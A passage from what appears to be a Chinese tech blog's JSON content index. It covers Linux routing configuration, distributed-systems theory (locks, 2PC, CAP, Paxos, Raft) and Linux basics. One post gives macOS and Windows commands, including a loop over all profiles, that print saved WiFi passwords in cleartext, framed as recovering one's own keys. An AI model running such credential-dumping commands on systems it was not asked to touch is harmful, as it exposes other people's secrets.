本文参考\n1.浅陌博文\n2.hexo官网\n​\n","permalink":"https://www.fenghong.tech/blog/2018/2018-06-10-hexo/","tags":["hexo"],"title":"hexo安装使用"},{"categories":["internet"],"contents":"摘要：路由的基本知识；路由的配置；路由的相关实验\n路由的基础知识 在日常运维作业中，经常会碰到路由表的操作。下面就linux运维中的路由操作做一梳理： \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; 先说一些关于路由的基础知识：\n  路由概念 路由： 跨越从源主机到目标主机的一个互联网络来转发数据包的过程 路由器：能够将数据包转发到正确的目的地，并在转发过程中选择最佳路径的设备 路由表：在路由器中维护的路由条目，路由器根据路由表做路径选择 直连路由：当在路由器上配置了接口的IP地址，并且接口状态为up的时候，路由表中就出现直连路由项 静态路由：是由管理员手工配置的，是单向的。 默认路由：当路由器在路由表中找不到目标网络的路由条目时，路由器把请求转发到默认路由接口 。\n  静态路由和默认路由的特点 静态路由特点: 路由表是手工设置的； 除非网络管理员干预，否则静态路由不会发生变化； 路由表的形成不需要占用网络资源； 适用环境：一般用于网络规模很小、拓扑结构固定的网络中。\n    默认路由特点:\n在所有路由类型中，默认路由的优先级最低 适用环境：一般应用在只有一个出口的末端网络中或作为其他路由的补充\n  浮动静态路由：\n路由表中存在相同目标网络的路由条目时，根据路由条目优先级的高低，将请求转发到相应端口； 链路冗余的作用；\n   路由器转发数据包时的封装过程 源IP和目标IP不发生变化，在网络的每一段传输时，源和目标MAC发生变化，进行重新封装，分别是每一段的源和目标地址\n  要完成对数据包的路由，一个路由器必须至少了解以下内容： a）目的地址 b）相连路由器，并可以从哪里获得远程网络的信息 c）到所有远程网络的可能路由 d）到达每个远程网络的最佳路由 e）如何维护并验证路由信息 f）路由和交换的对比\n   路由工作在网络层  a)根据“路由表”转发数据 b)路由选择 c)路由转发\n 交换工作在数据链路层  d)根据“MAC地址表”转发数据 e)硬件转发\n路由的命令  使用route -n命令查看Linux内核路由表  $ route -n Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 0.0.0.0 172.20.0.1 0.0.0.0 UG 100 0 0 ens37 172.20.0.0 0.0.0.0 255.255.0.0 U 100 0 0 ens37 192.168.1.0 0.0.0.0 255.255.255.0 U 100 0 0 ens33 192.168.122.0 0.0.0.0 255.255.255.0 U 0 0 0 virbr0 三种路由类型说明   主机路由  主机路由是路由选择表中指向单个IP地址或主机名的路由记录。主机路由的Flags字段为H。例如，在下面的示例中，本地主机通过IP地址192.168.1.1的路由器到达IP地址为10.0.0.10的主机。\nDestination Gateway Genmask Flags Metric Ref Use Iface ----------- ------- ------- ----- ------ --- --- ----- 10.0.0.10 192.168.1.1 255.255.255.255 UH 0 0 0 eth0  网络路由  网络路由是代表主机可以到达的网络。网络路由的Flags字段为N。例如，在下面的示例中，本地主机将发送到网络192.19.12的数据包转发到IP地址为192.168.1.1的路由器。\nDestination Gateway Genmask Flags Metric Ref Use Iface ----------- ------- ------- ----- ----- --- --- ----- 192.19.12 192.168.1.1 255.255.255.0 UN 0 0 0 eth0  默认路由 当主机不能在路由表中查找到目标主机的IP地址或网络路由时，数据包就被发送到默认路由（默认网关）上。默认路由的Flags字段为G。例如，在下面的示例中，默认路由是IP地址为192.168.1.1的路由器。  Destination Gateway Genmask Flags Metric Ref Use Iface ----------- ------- ------- ----- ------ --- --- ----- default 192.168.1.1 0.0.0.0 UG 0 0 0 eth0 配置路由route的命令 设置和查看路由表都可以用 route 命令，设置内核路由表的命令格式是：  route [add|del] [-net|-host] target [netmask Nm] [gw Gw] [[dev] If] 参数解释：\nadd 添加一条路由规则 del 删除一条路由规则 -net 目的地址是一个网络 -host 目的地址是一个主机 target 目的网络或主机 netmask 目的地址的网络掩码 gw 路由数据包通过的网关 dev 为路由指定的网络接口 route命令使用举例  添加到主机的路由 $ route add -host 192.168.1.2 dev eth0:0 $ route add -host 10.20.30.148 gw 10.20.30.40 添加到网络的路由 $ route add -net 10.20.30.40 netmask 255.255.255.248 eth0 $ route add -net 10.20.30.48 netmask 255.255.255.248 gw 10.20.30.41 $ route add -net 192.168.1.0/24 eth1 添加默认路由 $ route add default gw 192.168.1.1 删除路由 $ route del -host 192.168.1.2 dev eth0:0 $ route del -host 10.20.30.148 gw 10.20.30.40 $ route del -net 10.20.30.40 netmask 255.255.255.248 eth0 $ route del -net 10.20.30.48 netmask 255.255.255.248 gw 10.20.30.41 $ route del -net 192.168.1.0/24 eth1 $ route del default gw 192.168.1.1 //route del default 删除所有的默认路由 添加一条默认路由 $ route add default gw 10.0.0.1 //默认只在内存中生效 开机自启动可以追加到/etc/rc.local文件里 $ echo \u0026quot;route add default gw 10.0.0.1\u0026quot; \u0026gt;\u0026gt;/etc/rc.local 添加一条静态路由 $ route add -net 192.168.2.0/24 gw 192.168.2.254 要永久生效的话要这样做： $ echo \u0026quot;any net 192.168.2.0/24 gw 192.168.2.254\u0026quot; \u0026gt;\u0026gt;/etc/sysconfig/static-routes 添加到一台主机的静态路由 $ route add -host 192.168.2.2 gw 192.168.2.254 要永久生效的话要这样做： $ echo \u0026quot;any host 192.168.2.2 gw 192.168.2.254 \u0026quot; \u0026gt;\u0026gt;/etc/sysconfig/static-routes 注：Linux 默认没有这个文件 ，得手动创建一个 设置包转发  在Linux中默认的内核配置已经包含了路由功能，但默认并没有在系统启动时启用此功能； 开启Linux的路由功能可以通过调整内核的网络参数来实现，方法如下：\n 临时开启路由功能： # echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward 或者 # sysctl -w net.ipv4.ip_forward=1 永久开启路由功能 # vim /etc/sysctl.conf net.ipv4.ip_forward = 1 # sysctl -p 静态路由配置  添加静态路由到路由表的语法如下：\nip route [destination_network] [mask] [next-hop_address] administrative_distance] 参数解析：\nip route 用于创建静态路由的命令。 Destination_network 需要发布到路由表中的网段。 Mask 在这一网络上使用的子网掩码。 Next-hop_address 下一跳路由器的地址。 administrative_distance 默认时，静态路由有一个取值为1 的管理性距离。在这个命令的尾部添加管理权来修改这个默认值。 例如:\nip route 172.16.1.0 255.255.255.0 172.16.2.1 查看路由表除了使用route -n命令外，还可以使用ip route\n$ ip route default via 172.20.0.1 dev ens37 proto static metric 101 172.20.0.0/16 dev ens37 proto kernel scope link src 172.20.5.24 metric 101 172.20.0.24 dev ens37 scope link src 172.20.0.24 192.168.1.0/24 dev ens33 proto kernel scope link src 192.168.1.18 metric 100 实例 实例1 如上图所示，PC0机器和PC1机器之间经过两个路由器，要想使这两台机器通信，路由设置如下： 1）Route1路由器设置：\n$ ip add 192.168.1.1 255.255.255.0 $ ip add 192.168.2.1 255.255.255.0 $ ip route 192.168.3.0 255.255.255.0 192.168.2.2 $ echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward 2）Route2路由器设置：\n$ ip add 192.168.2.2 255.255.255.0 $ ip add 192.168.3.1 255.255.255.0 $ ip route 192.168.1.0 255.255.255.0 192.168.2.1 $ echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward 实例2 如上图所示，使用A主机192.168.1.2能够ping通E主机192.168.4.2，这两台机能够通信。\n操作思路：\n 在主机B上设置默认路由下一跳为192.168.2.2，并开启路由转发功能； 在主机C上设置2条静态路由，分别去192.168.1.0/24网段的下一跳为192.168.2.1，去192.168.4.0/24网段的下一跳为192.168.3.2，并开启路由转发功能； 在主机D上设置默认路由下一跳为192.168.3.1，并开启路由转发功能。  操作记录：\n1）A主机上操作：ip为192.168.1.2，设置网关为192.168.1.1 $ route add default gw 192.168.1.1 2）B主机上操作：第一块网卡为192.168.1.1，第二块网卡为192.168.2.1 $ ifconfig eth0 192.168.1.1 $ ifconfig eth1 192.168.2.1 //可以在一块网卡上设置两个ip，比如是eth0，eth0:0 B主机设置默认路由，下一跳为192.168.2.2 $ route add default gw 192.168.2.2 B主机开启路由转发功能 $ echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward //临时转发，可以在/etc/sysctl.conf里设置永久转发 3）C主机上操作：第一块网卡为192.168.2.2，第二块网卡为192.168.3.1 $ ifconfig eth0 192.168.2.2 $ ifconfig eth1 192.168.3.1 //如果就一块网卡，可以设置ifconfig eth0:0 192.168.3.1 C主机设置2条默认路由 $ route add -net 192.168.1.0/24 gw 192.168.2.1 $ route add -net 192.168.4.0/24 gw 192.168.3.2 C主机开启路由转发功能 $ echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward 4）D主机上操作：第一块网卡为192.168.3.2，第二块网卡为192.168.4.1 $ ifconfig eth0 192.168.3.2 $ ifconfig eth1 192.168.4.1 D主机设置默认路由，下一跳为192.168.3.1 $ route add default gw 192.168.3.1 D主机开启路由转发功能 $ echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward 5）E主机上操作：ip为192.168.4.2，设置网关为192.168.4.1 $ route add default gw 192.168.4.1 ","permalink":"https://www.fenghong.tech/blog/2018/2018-04-20-linux_router/","tags":["Linux","internet"],"title":"Linux下路由配置梳理"},{"categories":["tools"],"contents":"[TOC]\n 背景: WIFI密码老是忘记, 每次找起来特别麻烦, 有时候的重启路由器相关设置, 重新设置wifi密码, 这很困扰, 因此产生此篇文章.\n mac查看WIFI历史密码 terminal 打开terminal, 替换成相应的wifi名称.\n$ sudo security find-generic-password -ga \u0026quot;替换成wifi名称\u0026quot; | grep password keyChain 打开应用程序中『实用工具』文件夹中的『钥匙串访问』\n选择左侧的『密码』，就可以看到右侧有『airport网络密码』了\n双击需要查看密码的wifi名称，勾选下方的『显示密码』。根据提示输入系统密码后，wifi的密码就显示出来了。\nWindows查看历史wifi密码 terminal win+R输入cmd. 进入terminal终端;\n如果连WIFI名称记得不清楚,这个netsh wlan show profiles可以显示所有连接的WIFI历史信息\nC:\\Users\\Administrator\u0026gt; netsh wlan show profiles Profiles on interface WLAN: Group policy profiles (read only) --------------------------------- \u0026lt;None\u0026gt; User profiles ------------- All User Profile : ucloud-guest All User Profile : CMCC-vz2X All User Profile : ROUTER-001-0043 All User Profile : ChinaNet-Starbucks All User Profile : TP-LINK_5G_858F All User Profile : CMCC-w9A4 All User Profile : @701_5G All User Profile : @701 All User Profile : qianxiangG_A_5G All User Profile : qianxiangG_B_5G All User Profile : qianxiangG_C All User Profile : qianxiangG_B All User Profile : qianxiangG_A All User Profile : LOVE_FENG All User Profile : 混蛋！你问啥问 All User Profile : WELUV_TRV All User Profile : explorers0128 All User Profile : NIMABO All User Profile : “Coco”的 iPhone All User Profile : ChinaNet-CHu5-5G All User Profile : Mi8 找到自己想要记得的WIFI的名称,比如LOVE_FENG是我的WIFI名称\n输入netsh wlan show profiles \u0026quot;LOVE_FENG\u0026quot; key=clear| find \u0026quot;Key\u0026quot;\nC:\\Users\\Administrator\u0026gt; netsh wlan show profiles \u0026#34;LOVE_FENG\u0026#34; key=clear |find \u0026#34;Key\u0026#34; // 输出如下密码信息 Key Content : BABYf520... //这项就是密码了 一行命令 如果不想一行一行找,直接输入以下命令自己慢慢找\nC:\\Users\\Administrator\u0026gt; for /f \u0026#34;skip=9 tokens=1,2 delims=:\u0026#34; %i in (\u0026#39;netsh wlan show profiles\u0026#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear  参考  windows的文本工具findstr  谢谢\n","permalink":"https://www.fenghong.tech/blog/tools/wifi-passwod/","tags":["learning","mac","wifi"],"title":"查看WIFI历史密码"},{"categories":["algorithm"],"contents":"[TOC]\n一、分布式锁 在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。\n阻塞锁通常使用互斥量来实现：\n 互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态； 互斥量为 1 表示未锁定状态。  1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。\n数据库的唯一索引 获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否存于锁定状态。\n存在以下几个问题：\n 锁没有失效时间，解锁失败的话其它进程无法再获得该锁。 只能是非阻塞锁，插入失败直接就报错了，无法重试。 不可重入，已经获得锁的进程也必须重新获取锁。  Redis 的 SETNX 指令 使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。\nSETNX 指令和数据库的唯一索引类似，保证了只存在一个 Key 的键值对，那么可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。\nEXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了数据库唯一索引实现方式中释放锁失败的问题。\nRedis 的 RedLock 算法 使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。\n 尝试从 N 个相互独立 Redis 实例获取锁； 计算获取锁消耗的时间，只有当这个时间小于锁的过期时间，并且从大多数（N / 2 + 1）实例上获取了锁，那么就认为锁获取成功了； 如果锁获取失败，就到每个实例上释放锁。  Zookeeper 的有序节点 1. Zookeeper 抽象模型 Zookeeper 提供了一种树形结构级的命名空间，/app1/p_1 节点的父节点为 /app1。\n2. 节点类型  永久节点：不会因为会话结束或者超时而消失； 临时节点：如果会话结束或者超时就会消失； 有序节点：会在节点名的后面加一个数字后缀，并且是有序的，例如生成的有序节点为 /lock/node-0000000000，它的下一个有序节点则为 /lock/node-0000000001，以此类推。  3. 监听器 为一个节点注册监听器，在节点状态发生改变时，会给客户端发送消息。\n4. 分布式锁实现  创建一个锁目录 /lock； 当一个客户端需要获取锁时，在 /lock 下创建临时的且有序的子节点； 客户端获取 /lock 下的子节点列表，判断自己创建的子节点是否为当前子节点列表中序号最小的子节点，如果是则认为获得锁；否则监听自己的前一个子节点，获得子节点的变更通知后重复此步骤直至获得锁； 执行业务代码，完成后，删除对应的子节点。  5. 会话超时 如果一个已经获得锁的会话超时了，因为创建的是临时节点，所以该会话对应的临时节点会被删除，其它会话就可以获得锁了。可以看到，Zookeeper 分布式锁不会出现数据库的唯一索引实现的分布式锁释放锁失败问题。\n6. 羊群效应 一个节点未获得锁，只需要监听自己的前一个子节点，这是因为如果监听所有的子节点，那么任意一个子节点状态改变，其它所有子节点都会收到通知（羊群效应），而我们只希望它的后一个子节点收到通知。\n二、分布式事务 指事务的操作位于不同的节点上，需要保证事务的 ACID 特性。\n例如在下单场景下，库存和订单如果不在同一个节点上，就涉及分布式事务。\n本地消息表 本地消息表与业务数据表处于同一个数据库中，这样就能利用本地事务来保证在对这两个表的操作满足事务特性，并且使用了消息队列来保证最终一致性。\n 在分布式事务操作的一方完成写业务数据的操作之后向本地消息表发送一个消息，本地事务能保证这个消息一定会被写入本地消息表中。 之后将本地消息表中的消息转发到 Kafka 等消息队列中，如果转发成功则将消息从本地消息表中删除，否则继续重新转发。 在分布式事务操作的另一方从消息队列中读取一个消息，并执行消息中的操作。  2PC 两阶段提交（Two-phase Commit，2PC），通过引入协调者（Coordinator）来协调参与者的行为，并最终决定这些参与者是否要真正执行事务。\n1. 运行过程 1.1 准备阶段 协调者询问参与者事务是否执行成功，参与者发回事务执行结果。\n1.2 提交阶段 如果事务在每个参与者上都执行成功，事务协调者发送通知让参与者提交事务；否则，协调者发送通知让参与者回滚事务。\n需要注意的是，在准备阶段，参与者执行了事务，但是还未提交。只有在提交阶段接收到协调者发来的通知后，才进行提交或者回滚。\n2. 存在的问题 2.1 同步阻塞 所有事务参与者在等待其它参与者响应的时候都处于同步阻塞状态，无法进行其它操作。\n2.2 单点问题 协调者在 2PC 中起到非常大的作用，发生故障将会造成很大影响。特别是在阶段二发生故障，所有参与者会一直等待，无法完成其它操作。\n2.3 数据不一致 在阶段二，如果协调者只发送了部分 Commit 消息，此时网络发生异常，那么只有部分参与者接收到 Commit 消息，也就是说只有部分参与者提交了事务，使得系统数据不一致。\n2.4 太过保守 任意一个节点失败就会导致整个事务失败，没有完善的容错机制。\n三、CAP 分布式系统不可能同时满足一致性（C：Consistency）、可用性（A：Availability）和分区容忍性（P：Partition Tolerance），最多只能同时满足其中两项。\n一致性 一致性指的是多个数据副本是否能保持一致的特性，在一致性的条件下，系统在执行数据更新操作之后能够从一致性状态转移到另一个一致性状态。\n对系统的一个数据更新成功之后，如果所有用户都能够读取到最新的值，该系统就被认为具有强一致性。\n可用性 可用性指分布式系统在面对各种异常时可以提供正常服务的能力，可以用系统可用时间占总时间的比值来衡量，4 个 9 的可用性表示系统 99.99% 的时间是可用的。\n在可用性条件下，要求系统提供的服务一直处于可用的状态，对于用户的每一个操作请求总是能够在有限的时间内返回结果。\n分区容忍性 网络分区指分布式系统中的节点被划分为多个区域，每个区域内部可以通信，但是区域之间无法通信。\n在分区容忍性条件下，分布式系统在遇到任何网络分区故障的时候，仍然需要能对外提供一致性和可用性的服务，除非是整个网络环境都发生了故障。\n权衡 在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此，CAP 理论实际上是要在可用性和一致性之间做权衡。\n可用性和一致性往往是冲突的，很难使它们同时满足。在多个节点之间进行数据同步时，\n 为了保证一致性（CP），就需要让所有节点下线成为不可用的状态，等待同步完成； 为了保证可用性（AP），在同步过程中允许读取所有节点的数据，但是数据可能不一致。  四、BASE BASE 是基本可用（Basically Available）、软状态（Soft State）和最终一致性（Eventually Consistent）三个短语的缩写。\nBASE 理论是对 CAP 中一致性和可用性权衡的结果，它的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。\n基本可用 指分布式系统在出现故障的时候，保证核心可用，允许损失部分可用性。\n例如，电商在做促销时，为了保证购物系统的稳定性，部分消费者可能会被引导到一个降级的页面。\n软状态 指允许系统中的数据存在中间状态，并认为该中间状态不会影响系统整体可用性，即允许系统不同节点的数据副本之间进行同步的过程存在时延。\n最终一致性 最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能达到一致的状态。\nACID 要求强一致性，通常运用在传统的数据库系统上。而 BASE 要求最终一致性，通过牺牲强一致性来达到可用性，通常运用在大型分布式系统中。\n在实际的分布式场景中，不同业务单元和组件对一致性的要求是不同的，因此 ACID 和 BASE 往往会结合在一起使用。\n五、Paxos 用于达成共识性问题，即对多个节点产生的值，该算法能保证只选出唯一一个值。\n主要有三类节点：\n 提议者（Proposer）：提议一个值； 接受者（Acceptor）：对每个提议进行投票； 告知者（Learner）：被告知投票的结果，不参与投票过程。  执行过程 规定一个提议包含两个字段：[n, v]，其中 n 为序号（具有唯一性），v 为提议值。\n下图演示了两个 Proposer 和三个 Acceptor 的系统中运行该算法的初始过程，每个 Proposer 都会向所有 Acceptor 发送提议请求。\n当 Acceptor 接收到一个提议请求，包含的提议为 [n1, v1]，并且之前还未接收过提议请求，那么发送一个提议响应，设置当前接收到的提议为 [n1, v1]，并且保证以后不会再接受序号小于 n1 的提议。\n如下图，Acceptor X 在收到 [n=2, v=8] 的提议请求时，由于之前没有接收过提议，因此就发送一个 [no previous] 的提议响应，设置当前接收到的提议为 [n=2, v=8]，并且保证以后不会再接受序号小于 2 的提议。其它的 Acceptor 类似。\n如果 Acceptor 接收到一个提议请求，包含的提议为 [n2, v2]，并且之前已经接收过提议 [n1, v1]。如果 n1 \u0026gt; n2，那么就丢弃该提议请求；否则，发送提议响应，该提议响应包含之前已经接收过的提议 [n1, v1]，设置当前接收到的提议为 [n2, v2]，并且保证以后不会再接受序号小于 n2 的提议。\n如下图，Acceptor Z 收到 Proposer A 发来的 [n=2, v=8] 的提议请求，由于之前已经接收过 [n=4, v=5] 的提议，并且 n \u0026gt; 2，因此就抛弃该提议请求；Acceptor X 收到 Proposer B 发来的 [n=4, v=5] 的提议请求，因为之前接收到的提议为 [n=2, v=8]，并且 2 \u0026lt;= 4，因此就发送 [n=2, v=8] 的提议响应，设置当前接收到的提议为 [n=4, v=5]，并且保证以后不会再接受序号小于 4 的提议。Acceptor Y 类似。\n当一个 Proposer 接收到超过一半 Acceptor 的提议响应时，就可以发送接受请求。\nProposer A 接收到两个提议响应之后，就发送 [n=2, v=8] 接受请求。该接受请求会被所有 Acceptor 丢弃，因为此时所有 Acceptor 都保证不接受序号小于 4 的提议。\nProposer B 过后也收到了两个提议响应，因此也开始发送接受请求。需要注意的是，接受请求的 v 需要取它收到的最大 v 值，也就是 8。因此它发送 [n=4, v=8] 的接受请求。\nAcceptor 接收到接受请求时，如果序号大于等于该 Acceptor 承诺的最小序号，那么就发送通知给所有的 Learner。当 Learner 发现有大多数的 Acceptor 接收了某个提议，那么该提议的提议值就被 Paxos 选择出来。\n约束条件 1. 正确性 指只有一个提议值会生效。\n因为 Paxos 协议要求每个生效的提议被多数 Acceptor 接收，并且 Acceptor 不会接受两个不同的提议，因此可以保证正确性。\n2. 可终止性 指最后总会有一个提议生效。\nPaxos 协议能够让 Proposer 发送的提议朝着能被大多数 Acceptor 接受的那个提议靠拢，因此能够保证可终止性。\n六、Raft Raft 也是分布式一致性协议，主要是用来竞选主节点。\n单个 Candidate 的竞选 有三种节点：Follower、Candidate 和 Leader。Leader 会周期性的发送心跳包给 Follower。每个 Follower 都设置了一个随机的竞选超时时间，一般为 150ms~300ms，如果在这个时间内没有收到 Leader 的心跳包，就会变成 Candidate，进入竞选阶段。\n 下图展示一个分布式系统的最初阶段，此时只有 Follower 没有 Leader。Node A 等待一个随机的竞选超时时间之后，没收到 Leader 发来的心跳包，因此进入竞选阶段。   此时 Node A 发送投票请求给其它所有节点。   其它节点会对请求进行回复，如果超过一半的节点回复了，那么该 Candidate 就会变成 Leader。   之后 Leader 会周期性地发送心跳包给 Follower，Follower 接收到心跳包，会重新开始计时。  多个 Candidate 竞选  如果有多个 Follower 成为 Candidate，并且所获得票数相同，那么就需要重新开始投票。例如下图中 Node B 和 Node D 都获得两票，需要重新开始投票。   由于每个节点设置的随机竞选超时时间不同，因此下一次再次出现多个 Candidate 并获得同样票数的概率很低。  数据同步  来自客户端的修改都会被传入 Leader。注意该修改还未被提交，只是写入日志中。   Leader 会把修改复制到所有 Follower。   Leader 会等待大多数的 Follower 也进行了修改，然后才将修改提交。   此时 Leader 会通知的所有 Follower 让它们也提交修改，此时所有节点的值达成一致。  参考  倪超. 从 Paxos 到 ZooKeeper : 分布式一致性原理与实践 [M]. 电子工业出版社, 2015. Distributed locks with Redis 浅谈分布式锁 基于 Zookeeper 的分布式锁 Raft: Understandable Distributed Consensus 聊聊分布式事务，再说说解决方案 分布式系统的事务处理 深入理解分布式事务 What is CAP theorem in distributed database system? NEAT ALGORITHMS - PAXOS Paxos By Example  ","permalink":"https://www.fenghong.tech/blog/intro/distribute/","tags":["redis","paxos","Raft","algorithm"],"title":"分布式"},{"categories":["ops"],"contents":"[TOC]\n一、常用操作以及概念 快捷键  Tab：命令和文件名补全； Ctrl+C：中断正在运行的程序； Ctrl+D：结束键盘输入（End Of File，EOF）  求助 1. \u0026ndash;help 指令的基本用法与选项介绍。\n2. man man 是 manual 的缩写，将指令的具体信息显示出来。\n当执行man date时，有 DATE(1) 出现，其中的数字代表指令的类型，常用的数字及其类型如下：\n   代号 类型     1 用户在 shell 环境中可以操作的指令或者可执行文件   5 配置文件   8 系统管理员可以使用的管理指令    3. info info 与 man 类似，但是 info 将文档分成一个个页面，每个页面可以进行跳转。\n4. doc /usr/share/doc 存放着软件的一整套说明文件。\n关机 1. who 在关机前需要先使用 who 命令查看有没有其它用户在线。\n2. sync 为了加快对磁盘文件的读写速度，位于内存中的文件数据不会立即同步到磁盘上，因此关机之前需要先进行 sync 同步操作。\n3. shutdown # shutdown [-krhc] 时间 [信息] -k ： 不会关机，只是发送警告信息，通知所有在线的用户 -r ： 将系统的服务停掉后就重新启动 -h ： 将系统的服务停掉后就立即关机 -c ： 取消已经在进行的 shutdown 指令内容 PATH 可以在环境变量 PATH 中声明可执行文件的路径，路径之间用 : 分隔。\n/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/dmtsai/.local/bin:/home/dmtsai/bin sudo sudo 允许一般用户使用 root 可执行的命令，不过只有在 /etc/sudoers 配置文件中添加的用户才能使用该指令。\n包管理工具 RPM 和 DPKG 为最常见的两类软件包管理工具：\n RPM 全称为 Redhat Package Manager，最早由 Red Hat 公司制定实施，随后被 GNU 开源操作系统接受并成为很多 Linux 系统 (RHEL) 的既定软件标准。 与 RPM 进行竞争的是基于 Debian 操作系统 (Ubuntu) 的 DEB 软件包管理工具 DPKG，全称为 Debian Package，功能方面与 RPM 相似。  YUM 基于 RPM，具有依赖管理功能，并具有软件升级的功能。\n发行版 Linux 发行版是 Linux 内核及各种应用软件的集成版本。\n   基于的包管理工具 商业发行版 社区发行版     RPM Red Hat Fedora / CentOS   DPKG Ubuntu Debian    VIM 三个模式  一般指令模式（Command mode）：VIM 的默认模式，可以用于移动游标查看内容； 编辑模式（Insert mode）：按下 \u0026ldquo;i\u0026rdquo; 等按键之后进入，可以对文本进行编辑； 指令列模式（Bottom-line mode）：按下 \u0026ldquo;:\u0026rdquo; 按键之后进入，用于保存退出等操作。  在指令列模式下，有以下命令用于离开或者保存文件。\n   命令 作用     :w 写入磁盘   :w! 当文件为只读时，强制写入磁盘。到底能不能写入，与用户对该文件的权限有关   :q 离开   :q! 强制离开不保存   :wq 写入磁盘后离开   :wq! 强制写入磁盘后离开    GNU GNU 计划，译为革奴计划，它的目标是创建一套完全自由的操作系统，称为 GNU，其内容软件完全以 GPL 方式发布。其中 GPL 全称为 GNU 通用公共许可协议，包含了以下内容：\n 以任何目的运行此程序的自由； 再复制的自由； 改进此程序，并公开发布改进的自由。  开源协议  Choose an open source license 如何选择开源许可证？  二、磁盘 磁盘接口 1. IDE IDE（ATA）全称 Advanced Technology Attachment，接口速度最大为 133MB/s，因为并口线的抗干扰性太差，且排线占用空间较大，不利电脑内部散热，已逐渐被 SATA 所取代。\n2. SATA SATA 全称 Serial ATA，也就是使用串口的 ATA 接口，抗干扰性强，且对数据线的长度要求比 ATA 低很多，支持热插拔等功能。SATA-II 的接口速度为 300MiB/s，而新的 SATA-III 标准可达到 600MiB/s 的传输速度。SATA 的数据线也比 ATA 的细得多，有利于机箱内的空气流通，整理线材也比较方便。\n3. SCSI SCSI 全称是 Small Computer System Interface（小型机系统接口），经历多代的发展，从早期的 SCSI-II 到目前的 Ultra320 SCSI 以及 Fiber-Channel（光纤通道），接口型式也多种多样。SCSI 硬盘广为工作站级个人电脑以及服务器所使用，因此会使用较为先进的技术，如碟片转速 15000rpm 的高转速，且传输时 CPU 占用率较低，但是单价也比相同容量的 ATA 及 SATA 硬盘更加昂贵。\n4. SAS SAS（Serial Attached SCSI）是新一代的 SCSI 技术，和 SATA 硬盘相同，都是采取序列式技术以获得更高的传输速度，可达到 6Gb/s。此外也透过缩小连接线改善系统内部空间等。\n磁盘的文件名 Linux 中每个硬件都被当做一个文件，包括磁盘。磁盘以磁盘接口类型进行命名，常见磁盘的文件名如下：\n IDE 磁盘：/dev/hd[a-d] SATA/SCSI/SAS 磁盘：/dev/sd[a-p]  其中文件名后面的序号的确定与系统检测到磁盘的顺序有关，而与磁盘所插入的插槽位置无关。\n三、分区 分区表 磁盘分区表主要有两种格式，一种是限制较多的 MBR 分区表，一种是较新且限制较少的 GPT 分区表。\n1. MBR MBR 中，第一个扇区最重要，里面有主要开机记录（Master boot record, MBR）及分区表（partition table），其中主要开机记录占 446 bytes，分区表占 64 bytes。\n分区表只有 64 bytes，最多只能存储 4 个分区，这 4 个分区为主分区（Primary）和扩展分区（Extended）。其中扩展分区只有一个，它使用其它扇区用记录额外的分区表，因此通过扩展分区可以分出更多分区，这些分区称为逻辑分区。\nLinux 也把分区当成文件，分区文件的命名方式为：磁盘文件名 + 编号，例如 /dev/sda1。注意，逻辑分区的编号从 5 开始。\n2. GPT 不同的磁盘有不同的扇区大小，例如 512 bytes 和最新磁盘的 4 k。GPT 为了兼容所有磁盘，在定义扇区上使用逻辑区块地址（Logical Block Address, LBA），LBA 默认大小为 512 bytes。\nGPT 第 1 个区块记录了主要开机记录（MBR），紧接着是 33 个区块记录分区信息，并把最后的 33 个区块用于对分区信息进行备份。这 33 个区块第一个为 GPT 表头纪录，这个部份纪录了分区表本身的位置与大小和备份分区的位置，同时放置了分区表的校验码 (CRC32)，操作系统可以根据这个校验码来判断 GPT 是否正确。若有错误，可以使用备份分区进行恢复。\nGPT 没有扩展分区概念，都是主分区，每个 LAB 可以分 4 个分区，因此总共可以分 4 * 32 = 128 个分区。\nMBR 不支持 2.2 TB 以上的硬盘，GPT 则最多支持到 233TB = 8 ZB。\n开机检测程序 1. BIOS BIOS（Basic Input/Output System，基本输入输出系统），它是一个固件（嵌入在硬件中的软件），BIOS 程序存放在断电后内容不会丢失的只读内存中。\nBIOS 是开机的时候计算机执行的第一个程序，这个程序知道可以开机的磁盘，并读取磁盘第一个扇区的主要开机记录（MBR），由主要开机记录（MBR）执行其中的开机管理程序，这个开机管理程序会加载操作系统的核心文件。\n主要开机记录（MBR）中的开机管理程序提供以下功能：选单、载入核心文件以及转交其它开机管理程序。转交这个功能可以用来实现了多重引导，只需要将另一个操作系统的开机管理程序安装在其它分区的启动扇区上，在启动开机管理程序时，就可以通过选单选择启动当前的操作系统或者转交给其它开机管理程序从而启动另一个操作系统。\n下图中，第一扇区的主要开机记录（MBR）中的开机管理程序提供了两个选单：M1、M2，M1 指向了 Windows 操作系统，而 M2 指向其它分区的启动扇区，里面包含了另外一个开机管理程序，提供了一个指向 Linux 的选单。\n安装多重引导，最好先安装 Windows 再安装 Linux。因为安装 Windows 时会覆盖掉主要开机记录（MBR），而 Linux 